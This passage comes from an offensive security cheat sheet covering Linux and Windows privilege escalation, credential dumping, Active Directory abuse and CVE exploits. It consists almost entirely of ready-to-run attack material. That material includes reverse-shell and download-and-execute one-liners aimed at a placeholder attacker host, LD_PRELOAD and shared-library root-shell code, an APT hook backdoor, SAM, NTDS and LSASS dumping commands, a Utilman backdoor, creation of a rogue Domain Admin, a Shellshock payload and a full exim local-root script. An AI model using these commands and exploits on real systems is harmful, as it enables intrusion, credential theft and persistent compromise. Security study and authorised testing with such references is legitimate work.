</code></pre>
<h5>find Commands</h5>
<pre><code class="language-c">find / -user &lt;USERNAME&gt; -ls 2&gt;/dev/null
find / -user &lt;USERNAME&gt; -ls 2&gt;/dev/null | grep -v proc 2&gt;/dev/null
find / -group &lt;GROUP&gt; 2&gt;/dev/null
find / -perm -4000 2&gt;/dev/null | xargs ls -la
find / -type f -user root -perm -4000 2&gt;/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null
find / -cmin -60    // find files changed within the last 60 minutes
find / -amin -60    // find files accesses within the last 60 minutes
find ./ -type f -exec grep --color=always -i -I 'password' {} \;    // search for passwords
</code></pre>
<h5>grep for Passwords</h5>
<pre><code class="language-c">grep -R db_passwd
grep -roiE &quot;password.{20}&quot;
grep -oiE &quot;password.{20}&quot; /etc/*.conf
grep -v &quot;^[#;]&quot; /PATH/TO/FILE | grep -v &quot;^$&quot;    // grep for passwords like &quot;DBPassword:&quot;
</code></pre>
<h5>Apache2</h5>
<h6>Read first Line of a File with apache2 Binary</h6>
<pre><code class="language-c">sudo /usr/sbin/apache2 -f &lt;FILE&gt;
</code></pre>
<h5>APT</h5>
<pre><code class="language-c">echo 'apt::Update::Pre-Invoke {&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; &lt;LPORT&gt; &gt;/tmp/f&quot;};' &gt; /etc/apt/apt.conf.d/&lt;FILE&gt;
</code></pre>
<h5>arua2c</h5>
<pre><code class="language-c">aria2c -d /root/.ssh/ -o authorized_keys &quot;http://&lt;LHOST&gt;/authorized_keys&quot; --allow-overwrite=true
</code></pre>
<h5>Bash Debugging Mode</h5>
<ul>
<li>Bash &lt;4.4</li>
</ul>
<pre><code class="language-c">env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/&lt;BINARY&gt;
</code></pre>
<h5>Bash Functions</h5>
<ul>
<li>Bash &lt;4.2-048</li>
</ul>
<pre><code class="language-c">function /usr/sbin/&lt;BINARY&gt; { /bin/bash -p; }
export -f /usr/sbin/&lt;BINARY&gt;
/usr/sbin/&lt;BINARY&gt;
</code></pre>
<h5>LD_PRELOAD</h5>
<blockquote>
<p>https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</p>
</blockquote>
<h6>shell.c</h6>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init() {
	unsetenv(&quot;LD_PRELOAD&quot;);
	setresuid(0,0,0);
	system(&quot;/bin/bash -p&quot;);
}
</code></pre>
<p>or</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
void _init() {
unsetenv(&quot;LD_PRELOAD&quot;);
setgid(0);
setuid(0);
system(&quot;/bin/sh&quot;);
}
</code></pre>
<h6>Compiling</h6>
<pre><code class="language-c">gcc -o &lt;SHARED_OBJECT&gt;.so &lt;FILE&gt;.c -shared -FPIC -nostartfiles 
</code></pre>
<h6>Privilege Escalation</h6>
<pre><code class="language-c">sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/&lt;SHARED_OBJECT&gt;.so &lt;BINARY&gt;
</code></pre>
<h5>LD_LIBRARY_PATH</h5>
<h6>Get Information about Libraries</h6>
<pre><code class="language-c">ldd /PATH/TO/BINARY/&lt;BINARY&gt;
</code></pre>
<h6>shell.c</h6>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv(&quot;LD_LIBRARY_PATH&quot;);
	setresuid(0,0,0);
	system(&quot;/bin/bash -p&quot;);
}
</code></pre>
<h6>Compiling</h6>
<pre><code class="language-c">gcc -o &lt;LIBRARY&gt;.so.&lt;NUMBER&gt; -shared -fPIC &lt;FILE&gt;.c
</code></pre>
<h6>Privilege Escalation</h6>
<pre><code class="language-c">sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/&lt;LIBRARY&gt;.so.&lt;NUMBER&gt; &lt;BINARY&gt;
</code></pre>
<h5>logrotten</h5>
<blockquote>
<p>https://github.com/whotwagner/logrotten</p>
</blockquote>
<pre><code class="language-c">if [ `id -u` -eq 0 ]; then ( /bin/sh -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1 ); fi
</code></pre>
<h6>If &quot;create&quot;-option is set in logrotate.cfg</h6>
<pre><code class="language-c">./logrotten -p ./payloadfile /tmp/log/pwnme.log
</code></pre>
<h6>If &quot;compress&quot;-option is set in logrotate.cfg</h6>
<pre><code class="language-c">./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
</code></pre>
<h5>Path Variable Hijacking</h5>
<pre><code class="language-c">find / -perm -u=s -type f 2&gt;/dev/null
find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u
export PATH=$(pwd):$PATH
</code></pre>
<h5>PHP7.2</h5>
<pre><code class="language-c">/usr/bin/php7.2 -r &quot;pcntl_exec('/bin/bash', ['-p']);&quot;
</code></pre>
<h5>relayd</h5>
<p>The binary need to have the <code>SUID</code> bit set.</p>
<pre><code class="language-c">/usr/sbin/relayd -C /etc/shadow
</code></pre>
<h5>Shared Library Misconfiguration</h5>
<blockquote>
<p>https://tbhaxor.com/exploiting-shared-library-misconfigurations/</p>
</blockquote>
<h6>shell.c</h6>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void _init() {
    setuid(0);
    setgid(0);
    system(&quot;/bin/bash -i&quot;);
}
</code></pre>
<h6>Compiling</h6>
<pre><code class="language-c">gcc -shared -fPIC -nostartfiles -o &lt;FILE&gt;.so &lt;FILE&gt;.c
</code></pre>
<h5>Wildcards</h5>
<blockquote>
<p>https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</p>
</blockquote>
<p>With the command <code>touch -- --checkpoint=1</code> will be a file created. Why? Because the <code>--</code> behind the command <code>touch</code> is telling touch, that there's option to be wait for.
Instead of an option, it creates a file, named <code>--checkpoint=1</code>.</p>
<pre><code class="language-c">touch -- --checkpoint=1
</code></pre>
<p>or</p>
<pre><code class="language-c">touch ./--checkpoint=1
</code></pre>
<p>So after creating the <code>--checkpoint=1</code> file, i created another file, which executes a shell script.</p>
<pre><code class="language-c">touch -- '--checkpoint-action=exec=sh shell.sh'
</code></pre>
<p>or</p>
<pre><code class="language-c">touch ./--checkpoint-action=exec=&lt;FILE&gt;
</code></pre>
<p>To delete a misconfigured file, put a <code>./</code> in front of it.</p>
<pre><code class="language-c">rm ./'--checkpoint-action=exec=python script.sh'
</code></pre>
<h5>Writeable Directories in Linux</h5>
<pre><code class="language-c">/dev/shm
/tmp
</code></pre>
<h4>Microsoft Windows</h4>
<h5>Basic Windows Enumeration</h5>
<pre><code class="language-c">systeminfo
whoami /all
net users
net users &lt;USERNAME&gt;
tasklist /SVC
sc query
sc qc &lt;SERVICE&gt;
netsh firewall show state
schtasks /query /fo LIST /v
findstr /si password *.xml *.ini *.txt
dir /s *pass* == *cred* == *vnc* == *.config*
accesschk.exe -uws &quot;Everyone&quot; &quot;C:\Program Files\&quot;
wmic qfe get Caption,Description,HotFixID,InstalledOn
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
</code></pre>
<h5>AppLocker Bypass List</h5>
<pre><code>Bypass List (Windows 10 Build 1803):
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
</code></pre>
<h5>accesschk</h5>
<h6>Checking File Permissions</h6>
<pre><code class="language-c">.\accesschk.exe /accepteula -quvw &quot;C:\PATH\TO\FILE\&lt;FILE&gt;.exe&quot;
</code></pre>
<h6>Checking Service Permissions</h6>
<pre><code class="language-c">.\accesschk.exe /accepteula -uwcqv &lt;USERNAME&gt; daclsvc
</code></pre>
<h6>Checking Path Permissions to find Unquoted Service Paths</h6>
<pre><code class="language-c">.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq &quot;C:\Program Files\&quot;
.\accesschk.exe /accepteula -uwdq &quot;C:\Program Files\&lt;UNQUOTED_SERVICE_PATH&gt;&quot;
</code></pre>
<h6>Checking Registry Entries</h6>
<pre><code class="language-c">.\accesschk.exe /accepteula -uvwqk &lt;REGISTRY_KEY&gt;
</code></pre>
<h5>Adding Users to Groups</h5>
<pre><code class="language-c">net user &lt;USERNAME&gt; &lt;PASSWORD&gt; /add /domain
net group &quot;Exchange Windows Permissions&quot; /add &lt;USERNAME&gt;
net localgroup &quot;Remote Management Users&quot; /add &lt;USERNAME&gt;
</code></pre>
<h5>Enable Remote Desktop (RDP)</h5>
<pre><code class="language-c">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=yes
</code></pre>
<p>or</p>
<pre><code class="language-c">Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name &quot;fDenyTSConnections&quot; -Value 0;
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name &quot;UserAuthentication&quot; -Value 1;
Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;;
</code></pre>
<h5>Privileges and Permissions</h5>
<h6>AlwaysInstallElevated</h6>
<pre><code class="language-c">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
</code></pre>
<pre><code class="language-c">msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;LHOST&gt; lport=&lt;LPORT&gt; -f msi &gt; &lt;FILE&gt;.msi
</code></pre>
<pre><code class="language-c">msiexec /quiet /qn /i &lt;FILE&gt;.msi
</code></pre>
<h6>SeBackup and SeRestore Privilege</h6>
<h6>Backup SAM and SYSTEM Hashes</h6>
<pre><code class="language-c">reg save hklm\system C:\Users\&lt;USERNAME&gt;\system.hive
reg save hklm\sam C:\Users\&lt;USERNAME&gt;\sam.hive
</code></pre>
<h6>Dumping Hashes</h6>
<pre><code class="language-c">impacket-secretsdump -sam sam.hive -system system.hive LOCAL
</code></pre>
<h6>SeBackupPrivilege Privilege Escalation (diskshadow)</h6>
<blockquote>
<p>https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</p>
</blockquote>
<h6>Script for PowerShell Environment</h6>
<pre><code class="language-c">SET CONTEXT PERSISTENT NOWRITERSp
add volume c: alias foobarp
createp
expose %foobar% z:p
</code></pre>
<pre><code class="language-c">diskshadow /s &lt;FILE&gt;.txt
</code></pre>
<h6>Copy ntds.dit</h6>
<pre><code class="language-c">Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
</code></pre>
<h6>Export System Registry Value</h6>
<pre><code class="language-c">reg save HKLM\SYSTEM c:\temp\system
</code></pre>
<h6>Extract the Hashes</h6>
<pre><code class="language-c">impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
</code></pre>
<h6>Alternative Way via Robocopy</h6>
<pre><code class="language-c">reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
</code></pre>
<pre><code class="language-c">set metadata C:\Windows\temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
</code></pre>
<pre><code class="language-c">diskshadow /s script.txt
robocopy /b E:\Windows\ntds . ntds.dit
</code></pre>
<pre><code class="language-c">impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
</code></pre>
<h6>SeTakeOwnership Privilege</h6>
<pre><code class="language-c">takeown /f C:\Windows\System32\Utilman.exe
</code></pre>
<pre><code class="language-c">icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
</code></pre>
<pre><code class="language-c">C:\Windows\System32\&gt; copy cmd.exe utilman.exe
</code></pre>
<p>Click the <code>Ease of Access</code> button on the logon screen to get a shell with <code>NT Authority\System</code> privileges.</p>
<h6>SeImpersonate and SeAssignPrimaryToken Privilege</h6>
<blockquote>
<p>https://github.com/antonioCoco/RogueWinRM</p>
</blockquote>
<pre><code class="language-c">.\RogueWinRM.exe -p &quot;C:\&gt; .\nc64.exe&quot; -a &quot;-e cmd.exe &lt;LHOST&gt; &lt;LPORT&gt;&quot;
</code></pre>
<h5>Registry Handling</h5>
<h6>Enable Colored Output</h6>
<pre><code class="language-c">reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
</code></pre>
<p>Then open a new Terminal Window.</p>
<h6>Check for Auto Run Programs</h6>
<pre><code class="language-c">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
</code></pre>
<h6>Get Registry Key Information</h6>
<pre><code class="language-c">req query &lt;REGISTRY_KEY&gt;
</code></pre>
<h6>Modify Registry Key</h6>
<pre><code class="language-c">reg add &lt;REGISTRY_KEY&gt; /v &lt;VALUE_TO_MODIFY&gt; /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\&lt;FILE&gt;.exe /f
</code></pre>
<h5>Searching for Credentials</h5>
<h6>Quick Wins</h6>
<blockquote>
<p>https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&amp;s=09</p>
</blockquote>
<blockquote>
<p>https://www.nirsoft.net/utils/credentials_file_view.html</p>
</blockquote>
<pre><code class="language-c">cmdkey /list
rundll32 keymgr.dll, KRShowKeyMgr
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
reg query HKEY_CURRENT_USER\Software\&lt;USERNAME&gt;\PuTTY\Sessions\ /f &quot;Proxy&quot; /s
</code></pre>
<h6>Search for Passwords</h6>
<pre><code class="language-c">dir .s *pass* == *.config
findstr /si password *.xml *.ini *.txt
</code></pre>
<h6>PowerShell History</h6>
<pre><code class="language-c">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
</code></pre>
<h6>Saved Windows Credentials</h6>
<pre><code class="language-c">cmdkey /list
runas /savecred /user:&lt;USERNAME&gt; cmd.exe
</code></pre>
<h6>Search the Registry for Passwords</h6>
<pre><code class="language-c">reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
</code></pre>
<h6>Dumping Credentials</h6>
<pre><code class="language-c">reg save hklm\system system
reg save hklm\sam sam
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
</code></pre>
<h6>Internet Information Service (IIS)</h6>
<pre><code class="language-c">C:\Windows\System32\inetsrv&gt;appcmd.exe list apppool /@:*
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
</code></pre>
<h6>PuTTY</h6>
<pre><code class="language-c">reg query HKEY_CURRENT_USER\Software\&lt;USERNAME&gt;\PuTTY\Sessions\ /f &quot;Proxy&quot; /s
</code></pre>
<h6>Lsass</h6>
<pre><code class="language-c">tasklist
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrator\Documents\lsass.dmp full
</code></pre>
<h6>Unattended Windows Installations</h6>
<pre><code class="language-c">C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
</code></pre>
<h5>Insecure Service Permissions</h5>
<pre><code class="language-c">accesschk64.exe -qlc &lt;SERVICE&gt;
icacls C:\Users\&lt;USERNAME&gt;\&lt;FILE&gt;.exe /grant Everyone:F
sc config &lt;SERVICE&gt; binPath= &quot;C:\Users\&lt;USERNAME&gt;\&lt;FILE&gt;.exe&quot; obj= LocalSystem
sc stop &lt;SERVICE&gt;
sc start &lt;SERVICE&gt;
</code></pre>
<h5>Service Handling</h5>
<pre><code class="language-c">sc create &lt;SERVICE_NAME&gt;
sc start &lt;SERVICE_NAME&gt;
sc qc &lt;SERVICE_NAME&gt;
</code></pre>
<h5>Scheduled Tasks</h5>
<pre><code class="language-c">schtasks
schtasks /query /tn &lt;TASK&gt; /fo list /v
schtasks /run /tn &lt;TASK&gt;
Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State
</code></pre>
<h5>Unquoted Service Paths</h5>
<p>Search for <code>Unquoted Service Paths</code> by using <code>sc qc</code>.</p>
<pre><code class="language-c">sc qc
sc qc &lt;SERVICE&gt;
sc stop &lt;SERVICE&gt;
sc start &lt;SERVICE&gt;
</code></pre>
<pre><code class="language-c">icacls &lt;PROGRAM&gt;.exe
icacls C:\PROGRA~2\SYSTEM~1\&lt;SERVICE&gt;.exe
icacls C:\PROGRA~2\SYSTEM~1\&lt;SERVICE&gt;.exe /grant Everyone:F
</code></pre>
<h5>writeDACL</h5>
<blockquote>
<p>https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</p>
</blockquote>
<pre><code class="language-c">$SecPassword = ConvertTo-SecureString '&lt;PASSWORD&gt;' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('&lt;DOMAIN&gt;\&lt;USERNAME&gt;', $SecPassword)
Add-ObjectACL -PrincipalIdentity &lt;USERNAME&gt; -Credential $Cred -Rights DCSync
</code></pre>
<h5>WMIC</h5>
<pre><code class="language-c">wmic product get name,version,vendor
wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
</code></pre>
<h4>PassTheCert</h4>
<blockquote>
<p>https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html</p>
</blockquote>
<blockquote>
<p>https://github.com/AlmondOffSec/PassTheCert/tree/main/Python</p>
</blockquote>
<pre><code class="language-c">certipy-ad cert -pfx &lt;CERTIFICATE&gt;.pfx -nokey -out &lt;CERTIFICATE&gt;.crt
certipy-ad cert -pfx &lt;CERTIFICATE&gt;.pfx -nocert -out &lt;CERTIFICATE&gt;.key
python3 passthecert.py -domain '&lt;DOMAIN&gt;' -dc-host '&lt;DOMAIN&gt;' -action 'modify_user' -target '&lt;USERNAME&gt;' -new-pass '&lt;PASSWORD&gt;' -crt ./&lt;CERTIFICATE&gt;.crt -key ./&lt;CERTIFICATE&gt;.key
evil-winrm -i '&lt;RHOST&gt;' -u '&lt;USERNAME&gt;' -p '&lt;PASSWORD&gt;'
</code></pre>
<h4>PKINITtools</h4>
<pre><code class="language-c">python3 gettgtpkinit.py -cert-pfx &lt;USERNAME&gt;.pfx -dc-ip &lt;RHOST&gt; &lt;DOMAIN&gt;/&lt;USERNAME&gt; &lt;USERNAME&gt;.ccache
export KRB5CCNAME=&lt;USERNAME&gt;.ccache
python3 getnthash.py &lt;DOMAIN&gt;/&lt;USERNAME&gt; -key 6617cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554
</code></pre>
<h4>Port Scanning</h4>
<pre><code class="language-c">export ip=&lt;RHOST&gt;; for port in $(seq 1 65535); do timeout 0.01 bash -c &quot;&lt;/dev/tcp/$ip/$port &amp;&amp; echo The port $port is open || echo The Port $port is closed &gt; /dev/null&quot; 2&gt;/dev/null || echo Connection Timeout &gt; /dev/null; done
</code></pre>
<h4>powercat</h4>
<pre><code class="language-c">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;LHOST&gt;/powercat.ps1');powercat -c &lt;LHOST&gt; -p &lt;LPORT&gt; -e cmd&quot;
</code></pre>
<h4>Powermad</h4>
<pre><code class="language-c">Import-Module ./Powermad.ps1
$secureString = convertto-securestring &quot;&lt;PASSWORD&gt;&quot; -asplaintext -force
New-MachineAccount -MachineAccount &lt;NAME&gt; -Domain &lt;DOMAIN&gt; -DomainController &lt;DOMAIN&gt; -Password $secureString
</code></pre>
<h4>PowerShell</h4>
<h5>Common Commands</h5>
<pre><code class="language-c">whoami /all
getuserid
systeminfo
Get-Process
net users
net users &lt;USERNAME&gt;
Get-ADUser -Filter * -SearchBase &quot;DC=&lt;DOMAIN&gt;,DC=LOCAL&quot;
Get-Content &lt;FILE&gt;
Get-ChildItem . -Force
GCI -hidden
type &lt;FILE&gt; | findstr /l &lt;STRING&gt;
[convert]::ToBase64String((Get-Content -path &quot;&lt;FILE&gt;&quot; -Encoding byte))
</code></pre>
<h5>Allow Script Execution</h5>
<pre><code class="language-c">Set-ExecutionPolicy remotesigned
Set-ExecutionPolicy unrestricted
</code></pre>
<h5>Script Execution Bypass</h5>
<pre><code class="language-c">powershell.exe -noprofile -executionpolicy bypass -file .\&lt;FILE&gt;.ps1
</code></pre>
<h5>Import Module to PowerShell cmdlet</h5>
<pre><code class="language-c">Import-Module .\&lt;FILE&gt;
</code></pre>
<h5>Check PowerShell Versions</h5>
<pre><code class="language-c">Set-ExecutionPolicy Unrestricted
powershell -Command &quot;$PSVersionTable.PSVersion&quot;
powershell -c &quot;[Environment]::Is64BitProcess&quot;
</code></pre>
<h5>Read PowerShell History</h5>
<pre><code class="language-c">type C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
</code></pre>
<h5>Create a .zip File</h5>
<pre><code class="language-c">Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\&lt;FOLDER&gt; -DestinationPath C:\PATH\TO\FILE&lt;FILE&gt;.zip
</code></pre>
<h5>Unzip a File</h5>
<pre><code class="language-c">Expand-Archive -Force &lt;FILE&gt;.zip
</code></pre>
<h5>Start a new Process</h5>
<pre><code class="language-c">Start-Process -FilePath &quot;C:\nc64.exe&quot; -ArgumentList &quot;&lt;LHOST&gt; &lt;LPORT&gt; -e powershell&quot;
</code></pre>
<h5>Invoke-Expression / Invoke-WebRequest</h5>
<pre><code class="language-c">IEX(IWR http://&lt;LHOST&gt;/&lt;FILE&gt;.ps1)
Invoke-Expression (Invoke-WebRequest http://&lt;LHOST/&lt;FILE&gt;.ps1)
</code></pre>
<h5>.NET Reflection</h5>
<pre><code class="language-c">$bytes = (Invoke-WebRequest &quot;http://&lt;LHOST&gt;/&lt;FILE&gt;.exe&quot; -UseBasicParsing ).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('find', '/&lt;COMMAND&gt;')))
</code></pre>
<h5>Start offsec Session</h5>
<pre><code class="language-c">$offsec_session = New-PSSession -ComputerName &lt;RHOST&gt; -Authentication Negotiate -Credential &lt;USERNAME&gt;
Enter-PSSession $offsec_session
</code></pre>
<h5>Execute Command as another User</h5>
<pre><code class="language-c">$SecurePassword = ConvertTo-SecureString '&lt;PASSWORD&gt;' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('&lt;USERNAME&gt;', $SecurePassword)
$Session = New-PSSession -Credential $Cred
Invoke-Command -Session $session -scriptblock { whoami }
</code></pre>
<p>or</p>
<pre><code class="language-c">$username = '&lt;USERNAME&gt;'
$password = '&lt;PASSWORD&gt;'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process powershell.exe -Credential $credential
</code></pre>
<pre><code class="language-c">powershell -c &quot;$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *&quot;
</code></pre>
<h5>Add new Domain Administrator</h5>
<pre><code class="language-c">$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String &lt;PASSWORD&gt;
New-ADUser -Name &quot;&lt;USERNAME&gt;&quot; -Description &quot;&lt;DESCRIPTION&gt;&quot; -Enabled $true -AccountPassword $PASSWORD
Add-ADGroupMember -Identity &quot;Domain Admins&quot; -Member &lt;USERNAME&gt;
</code></pre>
<h5>Execute Commands in User Context</h5>
<pre><code class="language-c">$pass = ConvertTo-SecureString &quot;&lt;PASSWORD&gt;&quot; -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential (&quot;&lt;DOMAIN&gt;\&lt;USERNAME&gt;&quot;, $pass)
Invoke-Command -computername &lt;COMPUTERNAME&gt; -ConfigurationName dc_manage -credential $cred -command {whoami}
</code></pre>
<h5>Execute Scripts with Credentials (Reverse Shell)</h5>
<pre><code class="language-c">$pass = ConvertTo-SecureString &quot;&lt;PASSWORD&gt;&quot; -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential(&quot;&lt;DOMAIN&gt;\&lt;USERNAME&gt;&quot;, $pass)
Invoke-Command -Computer &lt;RHOST&gt; -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://&lt;LHOST&gt;/&lt;FILE&gt;.ps1') } -Credential $cred
</code></pre>
<h4>pwncat</h4>
<pre><code class="language-c">(local) pwncat$ back    // get back to shell
Ctrl+d                  // get back to pwncat shell
</code></pre>
<pre><code class="language-c">pwncat-cs -lp &lt;LPORT&gt;
(local) pwncat$ download /PATH/TO/FILE/&lt;FILE&gt; .
(local) pwncat$ upload /PATH/TO/FILE/&lt;FILE&gt; /PATH/TO/FILE/&lt;FILE&gt;
</code></pre>
<h4>rpcclient</h4>
<pre><code class="language-c">rpcclient -U &quot;&quot; &lt;RHOST&gt;
</code></pre>
<pre><code class="language-c">dsr_getdcname
dsr_getdcnameex
dsr_getdcnameex2
dsr_getsitename
enumdata
enumdomgroups
enumdomusers
enumjobs
enumports
enumprivs
getanydcname
getdcname
lookupsids
lsaenumsid &lt;SID&gt;
lsaquery
netconnenum
netdiskenum
netfileenum
netsessenum
netshareenum
netshareenumall
netsharegetinfo
queryuser &lt;USERNAME&gt;
srvinfo
</code></pre>
<h4>Rubeus</h4>
<h5>Overpass the Hash</h5>
<pre><code class="language-c">.\Rubeus.exe kerberoast /user:&lt;USERNAME&gt;
</code></pre>
<h5>Pass the Hash</h5>
<pre><code class="language-c">.\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
</code></pre>
<h4>RunasCs</h4>
<pre><code class="language-c">./RunasCs.exe -l 3 -d &lt;DOMAIN&gt; &quot;&lt;USERNAME&gt;&quot; '&lt;PASSWORD&gt;' 'C:\Users\&lt;USERNAME&gt;\Downloads\&lt;FILE&gt;.exe'
./RunasCs.exe -d &lt;DOMAIN&gt; &quot;&lt;USERNAME&gt;&quot; '&lt;PASSWORD&gt;' cmd.exe -r &lt;LHOST&gt;:&lt;LPORT&gt;
</code></pre>
<h4>smbpasswd</h4>
<pre><code class="language-c">smbpasswd -U &lt;RHOST&gt;\&lt;USERNAME&gt; -r &lt;RHOST&gt;
</code></pre>
<h4>winexe</h4>
<pre><code class="language-c">winexe -U '&lt;USERNAME%PASSWORD&gt;' //&lt;RHOST&gt; cmd.exe
winexe -U '&lt;USERNAME%PASSWORD&gt;' --system //&lt;RHOST&gt; cmd.exe
</code></pre>
<h3>CVE</h3>
<h4>CVE-2014-6271: Shellshock RCE PoC</h4>
<pre><code class="language-c">curl -H 'Cookie: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1' http://&lt;RHOST&gt;/cgi-bin/user.sh
</code></pre>
<h4>CVE-2016-1531: exim LPE</h4>
<ul>
<li>exim version &lt;= 4.84-3</li>
</ul>
<pre><code class="language-c">#!/bin/sh
# CVE-2016-1531 exim &lt;= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the &quot;perl_startup&quot; arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat &gt; /tmp/root.pm &lt;&lt; EOF
package root;
use strict;
use warnings;

system(&quot;/bin/sh&quot;);
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
</code></pre>
<h4>CVE-2019-14287: Sudo Bypass</h4>
<blockquote>
<p>https://www.exploit-db.com/exploits/47502</p>
</blockquote>
<h5>Prerequisites</h5>
<ul>
<li>Sudo version &lt; 1.8.28</li>
</ul>
<h5>Exploitation</h5>
<pre><code class="language-c">!root:
sudo -u#-1 /bin/bash
</code></pre>
<h4>CVE-2020-1472: ZeroLogon PE</h4>
<blockquote>
<p>https://github.com/SecuraBV/CVE-2020-1472</p>
</blockquote>
<blockquote>
<p>https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py</p>
</blockquote>
